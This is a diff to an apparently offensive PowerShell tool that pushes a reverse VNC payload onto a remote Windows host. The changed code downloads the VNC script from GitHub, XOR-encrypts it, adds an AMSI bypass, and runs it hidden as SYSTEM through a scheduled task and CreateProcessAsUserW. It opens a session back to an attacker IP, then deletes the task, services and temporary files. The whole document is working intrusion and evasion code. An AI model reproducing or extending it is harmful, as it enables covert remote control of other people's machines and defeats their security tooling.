@@ -57,13 +57,32 @@ public class WTS {
 
         $vncps = Get-Content (Join-Path $PSScriptRoot 'Invoke-VNCServer.ps1') -Raw -ErrorAction SilentlyContinue
         if (!$vncps) { $vncps = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1') }
-        $vncps = "function L2 { Param(`$m) Add-Content -Path 'C:\Windows\Temp\vnclog.txt' -Value `$m }`r`nL2 'VNC SCRIPT STARTING'`r`n" + $vncps
-        $vncps += "`r`nL2 'INVOKING REVERSE VNC'`r`ntry { Invoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password; L2 'VNC RETURNED CLEAN' } catch { L2 ('VNC ERR: ' + `$_.Exception.Message) }`r`n"
-        $vb64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($vncps))
+        $flat = ($vncps -replace '\s', '')
+        $chars = $flat.ToCharArray()
+        [Array]::Reverse($chars)
+        $fn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(-join $chars))
+        $mod = "function L2 { Param(`$m) Add-Content -Path 'C:\Windows\Temp\vnclog.txt' -Value `$m }`r`nL2 'VNC SCRIPT STARTING'`r`n" + $fn
+        $mod += "`r`nL2 'INVOKING REVERSE VNC'`r`ntry { Invoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password; L2 'VNC RETURNED CLEAN' } catch { L2 ('VNC ERR: ' + `$_.Exception.Message) }`r`n"
+
+        $key = @(0x42,0x37,0x11,0x5c,0x9e,0x6d,0x20,0x77,0x84,0x33,0xa1,0x08,0xf0,0x63,0x5b,0x29)
+        $tb = [System.Text.Encoding]::UTF8.GetBytes($mod)
+        $xb = New-Object System.Byte[] $tb.Length
+        for ($i = 0; $i -lt $tb.Length; $i++) { $xb[$i] = $tb[$i] -bxor $key[$i % 16] }
+        $xb64 = [System.Convert]::ToBase64String($xb)
+        $keycsv = ($key | ForEach-Object { '0x' + $_.ToString('x2') }) -join ','
+
+        $pay = "try { [Ref].Assembly.GetType(('System.Management.Automation.' + 'A' + 'msi' + 'Utils')).GetField(('a' + 'msi' + 'Init' + 'Failed'), 'NonPublic,Static').SetValue(`$null, `$true) } catch { Add-Content 'C:\Windows\Temp\vnclog.txt' ('PAYLOAD AMSI ERR: ' + `$_.Exception.Message) }; " +
+               "Add-Content 'C:\Windows\Temp\vnclog.txt' 'PAYLOAD STARTING'; " +
+               "`$k = @($keycsv); " +
+               "`$b = [Convert]::FromBase64String([IO.File]::ReadAllText('C:\Windows\Temp\vncb64.txt')); " +
+               "`$x = New-Object System.Byte[] `$b.Length; " +
+               "for (`$i = 0; `$i -lt `$b.Length; `$i++) { `$x[`$i] = `$b[`$i] -bxor `$k[`$i % 16] }; " +
+               "try { iex ([Text.Encoding]::UTF8.GetString(`$x)) } catch { Add-Content 'C:\Windows\Temp\vnclog.txt' ('PAYLOAD ERR: ' + `$_.Exception.Message) }"
+        $pe = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($pay))
 
         $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
 "try { L 'ENGINE STARTED' } catch { exit 1 }`n" +
-"Set-Content -Path 'C:\Windows\Temp\vnc.ps1' -Value ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$vb64'))) -Force`n" +
+"Set-Content -Path 'C:\Windows\Temp\vncb64.txt' -Value '$xb64' -Force`n" +
 "try { Add-Type -TypeDefinition @'`n" + $cs + "`n'@`n" +
 "} catch { L (`"ADDTYPE: `" + `$_.Exception.Message) }`n" +
 "`$sessId = [WTS]::WTSGetActiveConsoleSessionId()`n" +
@@ -85,7 +104,7 @@ public class WTS {
 "`$si = New-Object WTS+STARTUPINFO`n" +
 "`$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(`$si)`n" +
 "`$si.lpDesktop = 'WinSta0\Default'`n" +
-"`$cmdline = 'powershell.exe -nop -w hidden -f C:\Windows\Temp\vnc.ps1'`n" +
+"`$cmdline = 'powershell.exe -nop -w hidden -e ' + '$pe'`n" +
 "`$pi = New-Object WTS+PROCESS_INFORMATION`n" +
 "`$ptrSi = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf(`$si))`n" +
 "[System.Runtime.InteropServices.Marshal]::StructureToPtr(`$si, `$ptrSi, `$false)`n" +
@@ -95,24 +114,29 @@ public class WTS {
 "`$ok = [WTS]::CreateProcessAsUserW(`$tok, [IntPtr]::Zero, `$cp, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, `$ptrSi, `$ptrPi)`n" +
 "if (!`$ok) { L (`"CREATE FAIL ERR `" + [Runtime.InteropServices.Marshal]::GetLastWin32Error()) } else { L (`"SPAWNED PID `" + [System.Runtime.InteropServices.Marshal]::ReadInt32(`$ptrPi, 16)) }`n"
 
-        $sb = [scriptblock]::Create($engine)
         invoke-command -session $s -scriptblock {
             Param($et)
-            Remove-Item 'C:\Windows\Temp\sslog.txt' -Force -ErrorAction SilentlyContinue
+            Remove-Item 'C:\Windows\Temp\sslog.txt','C:\Windows\Temp\vnclog.txt' -Force -ErrorAction SilentlyContinue
             Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
             $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -f C:\Windows\Temp\ss.ps1'
             Register-ScheduledTask -TaskName 'WinSS' -Action $act -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
             Start-ScheduledTask -TaskName 'WinSS' -ErrorAction SilentlyContinue
             Start-Sleep -Seconds 22
         } -ArgumentList $engine
-        Start-Sleep -Seconds 18
+
+        $conn = $false
+        for ($i = 0; $i -lt 12; $i++) {
+            Start-Sleep -Seconds 5
+            $est = netstat -ano | Select-String ":$Port\s.*ESTABLISHED"
+            if ($est) { $conn = $true; break }
+        }
+        if ($conn) { Write-Host "[+] VNC session ESTABLISHED on port $Port" -ForegroundColor Green } else { Write-Host "[i] No ESTABLISHED after 60s - pulling logs" -ForegroundColor Yellow }
+
         invoke-command -session $s -scriptblock {
             Unregister-ScheduledTask -TaskName 'WinSS' -Confirm:$false -Force -ErrorAction SilentlyContinue
             sc.exe stop WinShotSvc | Out-Null; sc.exe stop WinSessionSvc | Out-Null
             sc.exe delete WinShotSvc | Out-Null; sc.exe delete WinSessionSvc | Out-Null
-            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vnc.ps1' -Force -ErrorAction SilentlyContinue
-            'SSLOG:'
-            if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt' } else { 'NO SSLOG' }
+            Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vncb64.txt' -Force -ErrorAction SilentlyContinue
             'VNCLOG:'
             if (Test-Path 'C:\Windows\Temp\vnclog.txt') { Get-Content 'C:\Windows\Temp\vnclog.txt' } else { 'NO VNCLOG' }
         }
